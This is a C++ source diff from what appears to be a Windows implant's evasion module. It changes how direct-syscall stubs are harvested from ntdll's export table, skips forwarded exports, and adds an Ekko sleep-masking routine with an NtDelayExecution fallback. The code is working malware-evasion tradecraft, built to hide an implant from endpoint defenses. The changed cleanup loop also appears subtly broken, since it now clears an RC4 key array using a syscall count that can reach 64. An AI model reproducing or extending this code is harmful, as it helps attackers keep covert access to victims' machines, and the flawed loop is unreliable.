@@ -12,7 +12,8 @@ static auto declfn init_syscall_table( instance& inst ) -> void {
     auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( base );
     auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( base + dos->e_lfanew );
 
-    auto eat_rva = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
+    auto eat_rva  = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
+    auto eat_size = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
     if ( !eat_rva ) return;
 
     auto eat       = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>( base + eat_rva );
@@ -20,13 +21,17 @@ static auto declfn init_syscall_table( instance& inst ) -> void {
     auto ordinals  = reinterpret_cast<uint16_t*>( base + eat->AddressOfNameOrdinals );
     auto functions = reinterpret_cast<uint32_t*>( base + eat->AddressOfFunctions );
 
-    for ( uint32_t i = 0; i < eat->NumberOfNames && inst.evasion.syscall_count < 16; i++ ) {
+    for ( uint32_t i = 0; i < eat->NumberOfNames && inst.evasion.syscall_count < 64; i++ ) {
         auto name = reinterpret_cast<char*>( base + names[i] );
 
         if ( name[0] != 'N' || name[1] != 't' ) continue;
         if ( name[2] == 'D' && name[3] == 'l' && name[4] == 'l' ) continue;
 
         auto func_rva  = functions[ ordinals[i] ];
+
+        // Skip forwarded exports (RVA falls within export directory range)
+        if ( func_rva >= eat_rva && func_rva < eat_rva + eat_size ) continue;
+
         auto func_addr = base + func_rva;
 
         if ( func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
@@ -108,7 +113,7 @@ auto declfn evasion_on_cleanup( instance& inst ) -> void {
     spoof_cleanup( inst );
 #endif
 
-    for ( uint32_t i = 0; i < 16; i++ ) {
+    for ( uint32_t i = 0; i < inst.evasion.syscall_count; i++ ) {
         inst.evasion.ekko.rc4_key[i] = 0;
     }
     inst.evasion.ekko.initialized = false;
@@ -122,6 +127,21 @@ auto declfn evasion_pre_sleep( instance& inst ) -> void {
 
 auto declfn evasion_post_sleep( instance& inst ) -> void {
     mask_post_sleep( inst );
+}
+
+auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
+#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
+    if ( inst.evasion.ekko.initialized ) {
+        ekko_sleep( inst, sleep_ms );
+        return;
+    }
+#endif
+    /* Fallback: standard pre-sleep → delay → post-sleep cycle */
+    evasion_pre_sleep( inst );
+    LARGE_INTEGER delay;
+    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+    inst.ntdll.NtDelayExecution( FALSE, &delay );
+    evasion_post_sleep( inst );
 }
 
 } // namespace starburst
